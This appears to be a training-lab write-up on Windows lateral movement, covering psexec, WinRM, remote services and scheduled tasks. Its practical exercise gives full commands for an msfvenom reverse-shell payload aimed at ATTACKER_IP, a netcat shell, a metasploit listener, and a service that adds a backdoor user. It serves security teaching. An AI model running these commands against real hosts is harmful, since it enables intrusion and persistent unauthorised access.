# Spawning Processes Remotely

This task explores the methods attackers can use to spawn processes remotely, enabling them to execute commands on machines where they have valid credentials. Each technique discussed has unique characteristics and may be better suited for specific scenarios.

---

## Psexec

- **Ports**: 445/TCP (SMB)  
- **Required Group Memberships**: Administrators  

Psexec has been a popular method for executing processes remotely for years. It allows an administrator to run commands on any PC where they have access. Psexec is part of the Sysinternals Tools suite and can be downloaded [here](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec).

### How Psexec Works:
1. Connects to the `Admin$` share and uploads a service binary (`psexesvc.exe`).
2. Creates and runs a service named `PSEXESVC` associated with `C:\Windows\psexesvc.exe`.
3. Establishes named pipes to handle `stdin`, `stdout`, and `stderr`.

### Example Command:
```bash
psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
```

---

## Remote Process Creation Using WinRM

- **Ports**: 5985/TCP (WinRM HTTP), 5986/TCP (WinRM HTTPS)  
- **Required Group Memberships**: Remote Management Users  

Windows Remote Management (WinRM) is a web-based protocol for sending PowerShell commands to Windows hosts remotely. Most Windows Server installations have WinRM enabled by default.

### Command Line Example:
```bash
winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
```

### PowerShell Example:
```powershell
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;

Enter-PSSession -Computername TARGET -Credential $credential
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
```

---

## Remotely Creating Services Using `sc`

- **Ports**:  
    - 135/TCP, 49152-65535/TCP (DCE/RPC)  
    - 445/TCP, 139/TCP (RPC over SMB Named Pipes)  
- **Required Group Memberships**: Administrators  

Windows services can execute arbitrary commands when started. Using `sc.exe`, a standard Windows tool, we can create and start services remotely.

### Example Commands:
```bash
sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
sc.exe \\TARGET start THMservice
sc.exe \\TARGET stop THMservice
sc.exe \\TARGET delete THMservice
```

---

## Creating Scheduled Tasks Remotely

Scheduled Tasks can also be used to execute commands remotely. The `schtasks` utility is available on all Windows installations.

### Example Commands:
```bash
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00
schtasks /s TARGET /run /TN "THMtask1"
schtasks /S TARGET /TN "THMtask1" /DELETE /F
```

---

## Practical Exercise

### Connecting to THMJMP2
1. Retrieve credentials from [this link](http://distributor.za.tryhackme.com/creds).
2. Connect to THMJMP2 via SSH:
     ```bash
     ssh za\\<AD Username>@thmjmp2.za.tryhackme.com
     ```

### Using `sc.exe` to Move Laterally
1. Generate a reverse shell payload:
     ```bash
     msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe
     ```
2. Upload the payload to the `ADMIN$` share:
     ```bash
     smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
     ```
3. Set up a listener:
     ```bash
     msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST lateralmovement; set LPORT 4444; exploit"
     ```
4. Spawn a reverse shell using `runas`:
     ```bash
     runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"
     ```
5. Create and start a service remotely:
     ```bash
     sc.exe \\thmiis.za.tryhackme.com create THMservice-3249 binPath= "%windir%\myservice.exe" start= auto
     sc.exe \\thmiis.za.tryhackme.com start THMservice-3249
     ```

---

**Note**: Always clean up after yourself by deleting any created services or tasks.